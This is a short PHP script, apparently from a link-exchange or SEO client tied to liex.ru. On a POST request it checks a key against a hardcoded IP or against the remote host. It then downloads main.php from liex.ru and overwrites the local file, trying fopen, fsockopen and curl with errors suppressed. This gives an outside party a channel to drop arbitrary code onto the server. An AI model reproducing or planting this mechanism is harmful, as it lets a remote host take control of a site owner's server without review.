<?php
function get_file_from_url($check_domain, $check_doc) {
	//попытка через fopen
	if (function_exists("fopen")) {
        	$fh = @fopen("http://" . $check_domain . ":80" . $check_doc, "r");
        	if ($fh) {
    			$r = '';
			while (!feof($fh)) $r .= fgets($fh);
        		fclose($fh);
            		return $r;
        	}
	}
	//попытка через fsockopen
	if (function_exists("fsockopen")) {
        	$sock = @fsockopen($check_domain, 80);
        	if ($sock) {
        		fputs ($sock, "GET ". $check_doc . " HTTP/1.0\r\nHost: " . $check_domain . "\r\n\r\n");
            		$r = "";
            		while (!feof($sock)) $r .= fgets($sock);
        		fclose($sock);
			$pos = strpos($r, "\r\n\r\n");
			if ($pos!==FALSE) $r = substr($r, $pos+4); else $r = '';
            		return  $r;
        	}
	}
    	//попытка через curl
	if (function_exists("curl_init")){
        	$ch = @curl_init("http://" . $check_domain . ":80" . $check_doc);
        	@curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        	@curl_setopt($ch, CURLOPT_TIMEOUT, 1200);
        	$result = @curl_exec($ch);
        	curl_close($ch);
        	return $result;
	}

	return FALSE;
}

function getip()
{
  if (getenv("REMOTE_ADDR") && strcasecmp(getenv("REMOTE_ADDR"), "unknown"))
    $ip = getenv("REMOTE_ADDR");

  elseif (!empty($_SERVER['REMOTE_ADDR']) && strcasecmp($_SERVER['REMOTE_ADDR'], "unknown"))
    $ip = $_SERVER['REMOTE_ADDR'];

  else
    $ip = "unknown";

  $n = strpos($ip, ",");
  if ($n) $ip = substr($ip, 0, $n);
  
  return($ip);
}

function check_valid_ip($code) {
	$valid_ip_addr = array('173.192.21.34');

	$ip = getip();

	foreach($valid_ip_addr as $a) {
		if($a==$ip) return true;
	}
//return false;

	$check_doc = "/websiteAction?action=checkOperation&code=" . $code;
	$check_domain = "liex.ru";

	$res = get_file_from_url($check_domain, $check_doc);
	return $res === 'ok';
}

function download_code() {

	$key = 'none';
	if (isset($_POST['key'])) $key = $_POST['key'];

	if (check_valid_ip($key)) {
		$res = get_file_from_url("liex.ru", "/main.php");
		if ($res) {
			$fg = @fopen("main.php", "w");
			if (!$fg) {
				unlink("main.php");
				$fg = @fopen("main.php", "w");
			}
			if ($fg) {
				fwrite($fg, $res);
				fclose($fg);
				echo "ok";
			} else echo "failed";
		} else echo "download failed";
	} else echo "ip check failed";
}

download_code();
?>